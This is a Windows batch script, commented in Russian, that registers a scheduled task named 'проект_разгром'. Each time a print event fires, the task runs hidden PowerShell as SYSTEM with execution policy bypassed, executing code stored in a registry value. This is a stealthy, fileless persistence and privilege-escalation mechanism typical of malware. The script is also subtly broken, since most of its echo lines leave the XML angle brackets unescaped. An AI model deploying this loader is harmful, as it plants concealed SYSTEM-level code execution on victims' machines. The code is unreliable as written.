@echo off
:: Задаём переменные
set scriptCode=Invoke-Expression (Get-ItemProperty -Path "HKCU:\Software\MyApp" -Name "MyScript").MyScript

:: Задаём путь для создания XML файла
set xmlFile=%TEMP%\task_temp.xml

:: Создаём XML-шаблон и вставляем команду PowerShell в соответствующие поля
echo ^<?xml version="1.0" encoding="UTF-16"?^> > %xmlFile%
echo <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"> >> %xmlFile%
echo   <RegistrationInfo> >> %xmlFile%
echo     <URI>\проект_разгром</URI> >> %xmlFile%
echo   </RegistrationInfo> >> %xmlFile%
echo   <Triggers> >> %xmlFile%
echo     <EventTrigger> >> %xmlFile%
echo       <Enabled>true</Enabled> >> %xmlFile%
echo       <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-PrintService/Operational"&gt;&lt;Select Path="Microsoft-Windows-PrintService/Operational"&gt;*[System[EventID=800]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription> >> %xmlFile%
echo     </EventTrigger> >> %xmlFile%
echo   </Triggers> >> %xmlFile%
echo   <Principals> >> %xmlFile%
echo     <Principal id="Author"> >> %xmlFile%
echo       <UserId>S-1-5-18</UserId> >> %xmlFile%
echo       <LogonType>InteractiveToken</LogonType> >> %xmlFile%
echo       <RunLevel>HighestAvailable</RunLevel> >> %xmlFile%
echo     </Principal> >> %xmlFile%
echo   </Principals> >> %xmlFile%
echo   <Settings> >> %xmlFile%
echo     <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> >> %xmlFile%
echo     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries> >> %xmlFile%
echo     <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries> >> %xmlFile%
echo     <AllowHardTerminate>false</AllowHardTerminate> >> %xmlFile%
echo     <StartWhenAvailable>true</StartWhenAvailable> >> %xmlFile%
echo     <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable> >> %xmlFile%
echo     <IdleSettings> >> %xmlFile%
echo       <StopOnIdleEnd>true</StopOnIdleEnd> >> %xmlFile%
echo       <RestartOnIdle>false</RestartOnIdle> >> %xmlFile%
echo     </IdleSettings> >> %xmlFile%
echo     <AllowStartOnDemand>true</AllowStartOnDemand> >> %xmlFile%
echo     <Enabled>true</Enabled> >> %xmlFile%
echo     <Hidden>false</Hidden> >> %xmlFile%
echo     <RunOnlyIfIdle>false</RunOnlyIfIdle> >> %xmlFile%
echo     <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession> >> %xmlFile%
echo     <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine> >> %xmlFile%
echo     <WakeToRun>false</WakeToRun> >> %xmlFile%
echo     <ExecutionTimeLimit>PT1H</ExecutionTimeLimit> >> %xmlFile%
echo     <Priority>7</Priority> >> %xmlFile%
echo   </Settings> >> %xmlFile%
echo   <Actions Context="Author"> >> %xmlFile%
echo     <Exec> >> %xmlFile%
echo       <Command>powershell.exe</Command> >> %xmlFile%
echo       <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -Command "%scriptCode%"</Arguments> >> %xmlFile%
echo       <WorkingDirectory>E:\Downloads\Проект_разгром</WorkingDirectory> >> %xmlFile%
echo     </Exec> >> %xmlFile%
echo   </Actions> >> %xmlFile%
echo </Task> >> %xmlFile%

:: Запуск задачи с созданным XML
schtasks /Create /TN "проект_разгром" /XML %xmlFile% /F

:: Можно удалить временный файл, если не нужен
:: del %xmlFile%
